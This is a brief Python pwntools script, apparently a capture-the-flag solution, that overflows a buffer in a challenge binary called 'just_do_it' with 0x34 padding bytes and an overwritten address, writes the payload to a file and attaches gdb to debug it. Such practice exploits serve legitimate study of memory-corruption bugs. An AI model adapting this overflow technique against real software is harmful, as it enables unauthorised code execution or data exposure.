#!/usr/bin/env python3
import argparse
import pwn
#elf = gdb.debug(binary.path, gdbscript='b *main + 129')

elf = pwn.ELF("./just_do_it")
p = elf.process()
buf = p.readuntil("password.")
#easy_addr = int(buf.split(b"WOW:")[1][:-1], 0)

payload =  b""
payload += b"D" * 0x34
#payload += pwn.p64(easy_addr + ???) #OR payload += p64(0x40061c) JUST HAS TO BE ANY return addr

payload += pwn.p32(0x0804a080)

with open("payload", "wb") as fp:
    fp.write(payload)

g = pwn.gdb.attach(
    p,
    gdbscript="""
    b *main+290
    r > payload
    """,
    )
#elf.sendline(payload)
#elf.interactive()
   
